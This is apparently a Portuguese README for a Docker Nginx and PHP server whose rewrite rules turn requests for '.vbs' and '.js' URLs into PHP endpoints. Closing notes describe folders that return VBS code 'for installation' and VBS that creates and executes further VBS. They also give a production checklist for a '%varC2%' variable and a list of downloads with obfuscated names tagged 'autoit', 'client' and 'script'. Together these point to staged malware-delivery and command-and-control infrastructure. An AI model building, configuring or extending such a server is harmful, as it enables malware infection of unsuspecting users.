# SERVER_WEB_CLIENT_DOWN

Stack Docker com **Nginx** e **PHP-FPM** (PHP 8.3), rede interna `skynet-network`, documento raiz HTTP em `public/`.

## Requisitos

- Docker e Docker Compose (plugin `docker compose` ou binário `docker-compose`)

## Arranque

Na raiz do projeto:

```bash
docker compose up -d --build
```

- **HTTP:** porta `80` → Nginx  
- **HTTPS:** porta `443` exposta (configuração SSL deve ser acrescentada ao Nginx se for usar TLS no próprio contentor)

Contentores:

| Serviço | Contentor      | Função        |
|---------|----------------|---------------|
| `nginx` | `skynet-nginx` | Servidor web  |
| `php`   | `skynet-php`   | PHP-FPM :9000 |

Ambos usam `restart: unless-stopped` e montam o projeto em `/var/www`.

## Estrutura relevante

| Caminho (host) | No contentor (Nginx `root`) | Notas |
|----------------|-----------------------------|--------|
| `public/`      | `/var/www/public`           | Raiz HTTP |
| `public/uploads/` | `/var/www/public/uploads` | Ficheiros estáticos em `/uploads/` |
| `docker/nginx/default.conf` | `/etc/nginx/conf.d/default.conf` | Configuração do site |
| `docker/php/`  | —                           | Imagem PHP-FPM |

## Redirecionamentos (equivalente a `.htaccess`)

As regras estão em `docker/nginx/default.conf`, no **bloco `server`** (fase `server_rewrite`), antes da escolha de `location`, para evitar que pedidos a URLs que terminam em `.vbs`/`.js` caiam em `try_files` sem ficheiro físico e devolvam 404.

| Padrão da URL (termina em) | Destino interno |
|----------------------------|-----------------|
| `…1.vbs`, `…2.vbs`, `…3.vbs` | `/g1/v1/index.php`, `/g2/v1/index.php`, `/g3/v1/index.php` (consoante o dígito) |
| `…1.js`, `…2.js`, `…3.js`   | `/g1/j1/index.php`, `/g2/j1/index.php`, `/g3/j1/index.php` |

O dígito `1`, `2` ou `3` antes da extensão é o que determina o grupo (`g1`, `g2`, `g3`).

Exemplos de teste (com os contentores a correr):

- `http://localhost/g1/v1/index.php`
- `http://localhost/g1/v1/1.vbs` (reescrito para o `index.php` de `g1/v1/`)

## Rotas Nginx (resumo)

- **PHP:** pedidos `*.php` via FastCGI para o serviço `php:9000`.
- **`/uploads/`:** `alias` para `public/uploads/`.
- **`/`:** `try_files` com fallback para `public/index.php` (front controller genérico).

Limite de corpo do pedido: **100 MB** (`client_max_body_size`).

## Alterar configuração

Depois de editar `docker/nginx/default.conf`:

```bash
docker exec skynet-nginx nginx -t && docker exec skynet-nginx nginx -s reload
```

Ou recria o serviço:

```bash
docker compose up -d nginx
```

## Compose

O campo `version` no `docker-compose.yml` é opcional nas versões recentes do Compose; pode surgir um aviso a indicar que está obsoleto — podes removê-lo sem alterar o comportamento.


pastas
vb - retorna o codigo do vbs para instalaçao
vbc - retorna o codigo para vbs que cria e exeuca vbs no publico


CHECKLIST DE PRODUÇAO 
Colocar o s em %varC2% ^& "s://" no arquivo vbc/consts.txt, dr quiser seguir como as pastas adicione /g%icontador%^


downloads
1- fg4gasgam1.fdgr3 autoit fg4gasgam3.fdgr3
2- v/fg4gasg472.fdgr3 client  fg4gasg472.fdgr3
3- fg4gasgam3.fdgr3 script fg4gasgam1.fdgr3

 